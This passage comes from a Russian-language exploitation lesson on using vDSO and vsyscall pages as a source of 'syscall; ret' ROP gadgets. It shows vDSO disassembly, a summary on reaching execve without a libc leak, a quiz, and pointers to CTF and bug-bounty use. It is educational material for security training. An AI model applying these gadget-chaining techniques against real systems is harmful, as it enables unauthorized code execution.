    1303:	48 83 e8 04          	sub    $0x4,%rax
    1307:	89 7a fc             	mov    %edi,-0x4(%rdx)
    130a:	c7 46 fc 00 00 00 00 	movl   $0x0,-0x4(%rsi)
    1311:	48 83 f8 01          	cmp    $0x1,%rax
    1315:	76 19                	jbe    1330 <__vdso_getrandom@@LINUX_2.6+0x1d0>
    1317:	0f b7 3e             	movzwl (%rsi),%edi
    131a:	48 83 c2 02          	add    $0x2,%rdx
    131e:	48 83 c6 02          	add    $0x2,%rsi
    1322:	48 83 e8 02          	sub    $0x2,%rax
    1326:	66 89 7a fe          	mov    %di,-0x2(%rdx)
    132a:	31 ff                	xor    %edi,%edi
    132c:	66 89 7e fe          	mov    %di,-0x2(%rsi)
    1330:	48 85 c0             	test   %rax,%rax
    1333:	74 08                	je     133d <__vdso_getrandom@@LINUX_2.6+0x1dd>
    1335:	0f b6 06             	movzbl (%rsi),%eax
    1338:	88 02                	mov    %al,(%rdx)
    133a:	c6 06 00             	movb   $0x0,(%rsi)
    133d:	48 29 cb             	sub    %rcx,%rbx
    1340:	41 00 8e 88 00 00 00 	add    %cl,0x88(%r14)
    1347:	49 01 cc             	add    %rcx,%r12
    134a:	48 85 db             	test   %rbx,%rbx
    134d:	0f 85 ef fe ff ff    	jne    1242 <__vdso_getrandom@@LINUX_2.6+0xe2>
    1353:	4c 8b 4d b0          	mov    -0x50(%rbp),%r9
    1357:	4c 89 f3             	mov    %r14,%rbx
    135a:	48 8d 05 9f ac ff ff 	lea    -0x5361(%rip),%rax        # ffffffffffffc000 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffffa990>
    1361:	49 8b 96 80 00 00 00 	mov    0x80(%r14),%rdx
    1368:	48 8b 00             	mov    (%rax),%rax
    136b:	48 39 c2             	cmp    %rax,%rdx
    136e:	0f 85 33 01 00 00    	jne    14a7 <__vdso_getrandom@@LINUX_2.6+0x347>
    1374:	b8 00 f0 ff 7f       	mov    $0x7ffff000,%eax
    1379:	41 c6 86 89 00 00 00 	movb   $0x0,0x89(%r14)
    1380:	00 
    1381:	49 39 c1             	cmp    %rax,%r9
    1384:	49 0f 46 c1          	cmovbe %r9,%rax
    1388:	48 83 c4 30          	add    $0x30,%rsp
    138c:	5b                   	pop    %rbx
    138d:	41 5c                	pop    %r12
    138f:	41 5d                	pop    %r13
    1391:	41 5e                	pop    %r14
    1393:	41 5f                	pop    %r15
    1395:	5d                   	pop    %rbp
    1396:	c3                   	ret
    1397:	cc                   	int3
    1398:	4c 89 e7             	mov    %r12,%rdi
    139b:	4c 89 f9             	mov    %r15,%rcx
    139e:	48 89 55 c0          	mov    %rdx,-0x40(%rbp)
    13a2:	48 89 75 c8          	mov    %rsi,-0x38(%rbp)
    13a6:	e8 45 01 00 00       	call   14f0 <__vdso_getrandom@@LINUX_2.6+0x390>
    13ab:	4c 89 f8             	mov    %r15,%rax
    13ae:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
    13b2:	48 8b 75 c8          	mov    -0x38(%rbp),%rsi
    13b6:	48 c1 e0 06          	shl    $0x6,%rax
    13ba:	49 01 c4             	add    %rax,%r12
    13bd:	48 29 c3             	sub    %rax,%rbx
    13c0:	e9 92 fe ff ff       	jmp    1257 <__vdso_getrandom@@LINUX_2.6+0xf7>
    13c5:	48 85 f6             	test   %rsi,%rsi
    13c8:	75 08                	jne    13d2 <__vdso_getrandom@@LINUX_2.6+0x272>
    13ca:	85 d2                	test   %edx,%edx
    13cc:	0f 84 95 00 00 00    	je     1467 <__vdso_getrandom@@LINUX_2.6+0x307>
    13d2:	81 e3 ff 0f 00 00    	and    $0xfff,%ebx
    13d8:	48 8d 83 90 00 00 00 	lea    0x90(%rbx),%rax
    13df:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
    13e5:	77 4e                	ja     1435 <__vdso_getrandom@@LINUX_2.6+0x2d5>
    13e7:	b8 3e 01 00 00       	mov    $0x13e,%eax
    13ec:	4c 89 ce             	mov    %r9,%rsi
    13ef:	0f 05                	syscall
    13f1:	48 83 c4 30          	add    $0x30,%rsp
    13f5:	5b                   	pop    %rbx
    13f6:	41 5c                	pop    %r12
    13f8:	41 5d                	pop    %r13
    13fa:	41 5e                	pop    %r14
    13fc:	41 5f                	pop    %r15
    13fe:	5d                   	pop    %rbp
    13ff:	c3                   	ret
    1400:	cc                   	int3
    1401:	48 89 83 80 00 00 00 	mov    %rax,0x80(%rbx)
    1408:	b8 3e 01 00 00       	mov    $0x13e,%eax
    140d:	48 8d 7b 60          	lea    0x60(%rbx),%rdi
    1411:	be 20 00 00 00       	mov    $0x20,%esi
    1416:	31 d2                	xor    %edx,%edx
    1418:	0f 05                	syscall
    141a:	48 83 f8 20          	cmp    $0x20,%rax
    141e:	0f 85 a9 00 00 00    	jne    14cd <__vdso_getrandom@@LINUX_2.6+0x36d>
    1424:	c6 83 88 00 00 00 60 	movb   $0x60,0x88(%rbx)
    142b:	be 60 00 00 00       	mov    $0x60,%esi
    1430:	e9 e7 fd ff ff       	jmp    121c <__vdso_getrandom@@LINUX_2.6+0xbc>
    1435:	48 c7 c0 f2 ff ff ff 	mov    $0xfffffffffffffff2,%rax
    143c:	e9 47 ff ff ff       	jmp    1388 <__vdso_getrandom@@LINUX_2.6+0x228>
    1441:	48 83 f9 03          	cmp    $0x3,%rcx
    1445:	77 15                	ja     145c <__vdso_getrandom@@LINUX_2.6+0x2fc>
    1447:	4c 89 e2             	mov    %r12,%rdx
    144a:	48 83 f9 01          	cmp    $0x1,%rcx
    144e:	0f 84 e1 fe ff ff    	je     1335 <__vdso_getrandom@@LINUX_2.6+0x1d5>
    1454:	48 89 c8             	mov    %rcx,%rax
    1457:	e9 bb fe ff ff       	jmp    1317 <__vdso_getrandom@@LINUX_2.6+0x1b7>
    145c:	4c 89 e2             	mov    %r12,%rdx
    145f:	48 89 c8             	mov    %rcx,%rax
    1462:	e9 92 fe ff ff       	jmp    12f9 <__vdso_getrandom@@LINUX_2.6+0x199>
    1467:	48 8d 79 14          	lea    0x14(%rcx),%rdi
    146b:	c7 41 08 28 00 00 00 	movl   $0x28,0x8(%rcx)
    1472:	48 b8 90 00 00 00 03 	movabs $0x300000090,%rax
    1479:	00 00 00 
    147c:	48 83 e7 f8          	and    $0xfffffffffffffff8,%rdi
    1480:	48 89 01             	mov    %rax,(%rcx)
    1483:	31 c0                	xor    %eax,%eax
    1485:	29 fb                	sub    %edi,%ebx
    1487:	48 c7 41 0c 00 00 00 	movq   $0x0,0xc(%rcx)
    148e:	00 
    148f:	48 c7 41 38 00 00 00 	movq   $0x0,0x38(%rcx)
    1496:	00 
    1497:	8d 4b 40             	lea    0x40(%rbx),%ecx
    149a:	c1 e9 03             	shr    $0x3,%ecx
    149d:	f3 48 ab             	rep stos %rax,(%rdi)
    14a0:	31 c0                	xor    %eax,%eax
    14a2:	e9 e1 fe ff ff       	jmp    1388 <__vdso_getrandom@@LINUX_2.6+0x228>
    14a7:	83 7d ac 01          	cmpl   $0x1,-0x54(%rbp)
    14ab:	75 14                	jne    14c1 <__vdso_getrandom@@LINUX_2.6+0x361>
    14ad:	48 8b 7d b8          	mov    -0x48(%rbp),%rdi
    14b1:	8b 55 a8             	mov    -0x58(%rbp),%edx
    14b4:	41 c6 86 89 00 00 00 	movb   $0x0,0x89(%r14)
    14bb:	00 
    14bc:	e9 26 ff ff ff       	jmp    13e7 <__vdso_getrandom@@LINUX_2.6+0x287>
    14c1:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%rbp)
    14c8:	e9 31 fd ff ff       	jmp    11fe <__vdso_getrandom@@LINUX_2.6+0x9e>
    14cd:	48 c7 83 80 00 00 00 	movq   $0x0,0x80(%rbx)
    14d4:	00 00 00 00 
    14d8:	48 8b 7d b8          	mov    -0x48(%rbp),%rdi
    14dc:	8b 55 a8             	mov    -0x58(%rbp),%edx
    14df:	c6 83 89 00 00 00 00 	movb   $0x0,0x89(%rbx)
    14e6:	e9 fc fe ff ff       	jmp    13e7 <__vdso_getrandom@@LINUX_2.6+0x287>
    14eb:	90                   	nop
    14ec:	90                   	nop
    14ed:	90                   	nop
    14ee:	90                   	nop
    14ef:	90                   	nop
    14f0:	0f 28 2d 69 f0 ff ff 	movaps -0xf97(%rip),%xmm5        # 560 <LINUX_2.6@@LINUX_2.6+0x560>
    14f7:	0f 10 36             	movups (%rsi),%xmm6
    14fa:	0f 10 7e 10          	movups 0x10(%rsi),%xmm7
    14fe:	f3 44 0f 7e 02       	movq   (%rdx),%xmm8
    1503:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
    150a:	66 4c 0f 6e c8       	movq   %rax,%xmm9
    150f:	66 0f 6f cd          	movdqa %xmm5,%xmm1
    1513:	66 0f 6f d6          	movdqa %xmm6,%xmm2
    1517:	66 0f 6f df          	movdqa %xmm7,%xmm3
    151b:	66 41 0f 6f e0       	movdqa %xmm8,%xmm4
    1520:	b0 0a                	mov    $0xa,%al
    1522:	66 0f fe ca          	paddd  %xmm2,%xmm1
    1526:	66 0f ef e1          	pxor   %xmm1,%xmm4
    152a:	66 0f 6f c4          	movdqa %xmm4,%xmm0
    152e:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
    1533:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
    1538:	66 0f eb e0          	por    %xmm0,%xmm4
    153c:	66 0f fe dc          	paddd  %xmm4,%xmm3
    1540:	66 0f ef d3          	pxor   %xmm3,%xmm2
    1544:	66 0f 6f c2          	movdqa %xmm2,%xmm0
    1548:	66 0f 72 f0 0c       	pslld  $0xc,%xmm0
    154d:	66 0f 72 d2 14       	psrld  $0x14,%xmm2
    1552:	66 0f eb d0          	por    %xmm0,%xmm2
    1556:	66 0f fe ca          	paddd  %xmm2,%xmm1
    155a:	66 0f ef e1          	pxor   %xmm1,%xmm4
    155e:	66 0f 6f c4          	movdqa %xmm4,%xmm0
    1562:	66 0f 72 f0 08       	pslld  $0x8,%xmm0
    1567:	66 0f 72 d4 18       	psrld  $0x18,%xmm4
    156c:	66 0f eb e0          	por    %xmm0,%xmm4
    1570:	66 0f fe dc          	paddd  %xmm4,%xmm3
    1574:	66 0f ef d3          	pxor   %xmm3,%xmm2
    1578:	66 0f 6f c2          	movdqa %xmm2,%xmm0
    157c:	66 0f 72 f0 07       	pslld  $0x7,%xmm0
    1581:	66 0f 72 d2 19       	psrld  $0x19,%xmm2
    1586:	66 0f eb d0          	por    %xmm0,%xmm2
    158a:	66 0f 70 d2 39       	pshufd $0x39,%xmm2,%xmm2
    158f:	66 0f 70 db 4e       	pshufd $0x4e,%xmm3,%xmm3
    1594:	66 0f 70 e4 93       	pshufd $0x93,%xmm4,%xmm4
    1599:	66 0f fe ca          	paddd  %xmm2,%xmm1
    159d:	66 0f ef e1          	pxor   %xmm1,%xmm4
    15a1:	66 0f 6f c4          	movdqa %xmm4,%xmm0
    15a5:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
    15aa:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
    15af:	66 0f eb e0          	por    %xmm0,%xmm4
    15b3:	66 0f fe dc          	paddd  %xmm4,%xmm3
    15b7:	66 0f ef d3          	pxor   %xmm3,%xmm2
    15bb:	66 0f 6f c2          	movdqa %xmm2,%xmm0
    15bf:	66 0f 72 f0 0c       	pslld  $0xc,%xmm0
    15c4:	66 0f 72 d2 14       	psrld  $0x14,%xmm2
    15c9:	66 0f eb d0          	por    %xmm0,%xmm2
    15cd:	66 0f fe ca          	paddd  %xmm2,%xmm1
    15d1:	66 0f ef e1          	pxor   %xmm1,%xmm4
    15d5:	66 0f 6f c4          	movdqa %xmm4,%xmm0
    15d9:	66 0f 72 f0 08       	pslld  $0x8,%xmm0
    15de:	66 0f 72 d4 18       	psrld  $0x18,%xmm4
    15e3:	66 0f eb e0          	por    %xmm0,%xmm4
    15e7:	66 0f fe dc          	paddd  %xmm4,%xmm3
    15eb:	66 0f ef d3          	pxor   %xmm3,%xmm2
    15ef:	66 0f 6f c2          	movdqa %xmm2,%xmm0
    15f3:	66 0f 72 f0 07       	pslld  $0x7,%xmm0
    15f8:	66 0f 72 d2 19       	psrld  $0x19,%xmm2
    15fd:	66 0f eb d0          	por    %xmm0,%xmm2
    1601:	66 0f 70 d2 93       	pshufd $0x93,%xmm2,%xmm2
    1606:	66 0f 70 db 4e       	pshufd $0x4e,%xmm3,%xmm3
    160b:	66 0f 70 e4 39       	pshufd $0x39,%xmm4,%xmm4
    1610:	fe c8                	dec    %al
    1612:	0f 85 0a ff ff ff    	jne    1522 <__vdso_getrandom@@LINUX_2.6+0x3c2>
    1618:	66 0f fe cd          	paddd  %xmm5,%xmm1
    161c:	0f 11 0f             	movups %xmm1,(%rdi)
    161f:	66 0f fe d6          	paddd  %xmm6,%xmm2
    1623:	0f 11 57 10          	movups %xmm2,0x10(%rdi)
    1627:	66 0f fe df          	paddd  %xmm7,%xmm3
    162b:	0f 11 5f 20          	movups %xmm3,0x20(%rdi)
    162f:	66 41 0f fe e0       	paddd  %xmm8,%xmm4
    1634:	0f 11 67 30          	movups %xmm4,0x30(%rdi)
    1638:	66 45 0f d4 c1       	paddq  %xmm9,%xmm8
    163d:	48 83 c7 40          	add    $0x40,%rdi
    1641:	48 ff c9             	dec    %rcx
    1644:	0f 85 c5 fe ff ff    	jne    150f <__vdso_getrandom@@LINUX_2.6+0x3af>
    164a:	66 44 0f d6 02       	movq   %xmm8,(%rdx)
    164f:	66 0f ef c9          	pxor   %xmm1,%xmm1
    1653:	66 0f ef d2          	pxor   %xmm2,%xmm2
    1657:	66 0f ef db          	pxor   %xmm3,%xmm3
    165b:	66 0f ef e4          	pxor   %xmm4,%xmm4
    165f:	66 0f ef f6          	pxor   %xmm6,%xmm6
    1663:	66 0f ef ff          	pxor   %xmm7,%xmm7
    1667:	66 0f ef c0          	pxor   %xmm0,%xmm0
    166b:	c3                   	ret
    166c:	90                   	nop
    166d:	90                   	nop
    166e:	90                   	nop
    166f:	90                   	nop

0000000000001670 <__vdso_sgx_enter_enclave@@LINUX_2.6>:
    1670:	55                   	push   %rbp
    1671:	48 89 e5             	mov    %rsp,%rbp
    1674:	53                   	push   %rbx
    1675:	89 c8                	mov    %ecx,%eax
    1677:	83 f8 02             	cmp    $0x2,%eax
    167a:	72 49                	jb     16c5 <__vdso_sgx_enter_enclave@@LINUX_2.6+0x55>
    167c:	83 f8 03             	cmp    $0x3,%eax
    167f:	77 44                	ja     16c5 <__vdso_sgx_enter_enclave@@LINUX_2.6+0x55>
    1681:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
    1685:	48 c7 c3 28 00 00 00 	mov    $0x28,%rbx
    168c:	48 83 3c 19 00       	cmpq   $0x0,(%rcx,%rbx,1)
    1691:	75 32                	jne    16c5 <__vdso_sgx_enter_enclave@@LINUX_2.6+0x55>
    1693:	48 83 c3 08          	add    $0x8,%rbx
    1697:	48 81 fb 00 01 00 00 	cmp    $0x100,%rbx
    169e:	75 ec                	jne    168c <__vdso_sgx_enter_enclave@@LINUX_2.6+0x1c>
    16a0:	48 8b 19             	mov    (%rcx),%rbx
    16a3:	48 8d 0d 00 00 00 00 	lea    0x0(%rip),%rcx        # 16aa <__vdso_sgx_enter_enclave@@LINUX_2.6+0x3a>
    16aa:	0f 01 d7             	enclu
    16ad:	48 8b 5d 10          	mov    0x10(%rbp),%rbx
    16b1:	c7 43 08 04 00 00 00 	movl   $0x4,0x8(%rbx)
    16b8:	48 83 7b 18 00       	cmpq   $0x0,0x18(%rbx)
    16bd:	75 22                	jne    16e1 <__vdso_sgx_enter_enclave@@LINUX_2.6+0x71>
    16bf:	31 c0                	xor    %eax,%eax
    16c1:	5b                   	pop    %rbx
    16c2:	c9                   	leave
    16c3:	c3                   	ret
    16c4:	cc                   	int3
    16c5:	b8 ea ff ff ff       	mov    $0xffffffea,%eax
    16ca:	eb f5                	jmp    16c1 <__vdso_sgx_enter_enclave@@LINUX_2.6+0x51>
    16cc:	48 8b 5d 10          	mov    0x10(%rbp),%rbx
    16d0:	89 43 08             	mov    %eax,0x8(%rbx)
    16d3:	66 89 7b 0c          	mov    %di,0xc(%rbx)
    16d7:	66 89 73 0e          	mov    %si,0xe(%rbx)
    16db:	48 89 53 10          	mov    %rdx,0x10(%rbx)
    16df:	eb d7                	jmp    16b8 <__vdso_sgx_enter_enclave@@LINUX_2.6+0x48>
    16e1:	48 89 e1             	mov    %rsp,%rcx
    16e4:	48 89 d8             	mov    %rbx,%rax
    16e7:	48 89 e3             	mov    %rsp,%rbx
    16ea:	48 83 e3 0f          	and    $0xf,%rbx
    16ee:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
    16f2:	50                   	push   %rax
    16f3:	50                   	push   %rax
    16f4:	fc                   	cld
    16f5:	48 8b 40 18          	mov    0x18(%rax),%rax
    16f9:	0f ae e8             	lfence
    16fc:	ff d0                	call   *%rax
    16fe:	48 8d 64 1c 10       	lea    0x10(%rsp,%rbx,1),%rsp
    1703:	83 f8 00             	cmp    $0x0,%eax
    1706:	7e b9                	jle    16c1 <__vdso_sgx_enter_enclave@@LINUX_2.6+0x51>
    1708:	e9 6a ff ff ff       	jmp    1677 <__vdso_sgx_enter_enclave@@LINUX_2.6+0x7>

Disassembly of section .altinstr_replacement:

00000000000017df <.altinstr_replacement>:
    17df:	0f ae e8             	lfence
    17e2:	0f 31                	rdtsc
    17e4:	0f 01 f9             	rdtscp
    17e7:	0f ae e8             	lfence
    17ea:	0f 31                	rdtsc
    17ec:	0f 01 f9             	rdtscp
    17ef:	0f ae e8             	lfence
    17f2:	0f 31                	rdtsc
    17f4:	0f 01 f9             	rdtscp
    17f7:	0f ae e8             	lfence
    17fa:	0f 31                	rdtsc
    17fc:	0f 01 f9             	rdtscp
    17ff:	0f ae e8             	lfence
    1802:	0f 31                	rdtsc
    1804:	0f 01 f9             	rdtscp
    1807:	0f ae e8             	lfence
    180a:	0f 31                	rdtsc
    180c:	0f 01 f9             	rdtscp
    180f:	0f ae e8             	lfence
    1812:	0f 31                	rdtsc
    1814:	0f 01 f9             	rdtscp
    1817:	f3 0f c7 f8          	rdpid  %rax
```

Подсказка из лаборатории: `objdump -d <файл>`.

## Что мы теперь знаем

- vDSO и vsyscall — страницы, отображённые ядром, содержат `syscall; ret`.
- vsyscall имеет фиксированный адрес `0xffffffffff600000`, но часто отключён.
- vDSO рандомизирован, но всегда присутствует; нужна утечка базы.
- С этими гаджетами можно сделать `execve` без libc-утечки.
- Всегда проверяй `/proc/self/maps` перед выбором приёма.

## Квиз

Проверь себя.

```quiz
- question: "Что такое vDSO?"
  options:
    - "Отображённый ядром код, содержащий syscall-гаджеты"
    - "Виртуальный диск"
    - "Таблица GOT"
    - "Раздел ELF"
  answer: 0
  explanation: "linux-vdso.so.1 всегда замаплен и содержит `syscall; ret`."
- question: "Чем vsyscall отличается от vDSO?"
  options:
    - "vsyscall имеет фиксированный адрес"
    - "vsyscall живёт в куче"
    - "vsyscall только для ARM"
    - "Ничем"
  answer: 0
  explanation: "Классический vsyscall по адресу 0xffffffffff600000 не рандомизируется."
- question: "Что даёт vDSO в ROP?"
  options:
    - "Гаджет syscall; ret без libc"
    - "Утечку canary"
    - "Отключение ASLR"
    - "Расширение tcache"
  answer: 0
  explanation: "vDSO содержит `syscall; ret`, полезный при отсутствии libc-утечки."
- question: "Какие регистры нужны для syscall в x86-64?"
  options:
    - "rax (номер), rdi, rsi, rdx (аргументы)"
    - "rbx, rcx, r8"
    - "только rax"
    - "x0, x1, x2"
  answer: 0
  explanation: "Номер вызова — в rax, аргументы — в rdi/rsi/rdx/r10/r8/r9."
- question: "Почему на новых ядрах vsyscall может не работать?"
  options:
    - "Он эмулируется или отключён (vsyscall=none/emulate)"
    - "Его нет в 32-битных системах"
    - "Он только для Windows"
    - "Он требует libc"
  answer: 0
  explanation: "Современные ядра ограничивают vsyscall, поэтому проверяй maps."
```

## Куда дальше

В `pwn-brop` мы уберём и последнее, что у нас было — сам бинарь: научимся строить цепочку, видя лишь поведение сетевого сервиса. А пока главное: **когда в бинаре нет `syscall`, его дают страницы, которые ядро отображает в каждый процесс.**

## Где пригодится

- **CTF:** Pwn — задачи без libc-утечки, статические бинари.
- **Bug bounty:** построение цепочек в ограниченных условиях.
- **Пентест:** разработка эксплойтов.
- **Работа:** exploit development и понимание адресного пространства Linux.
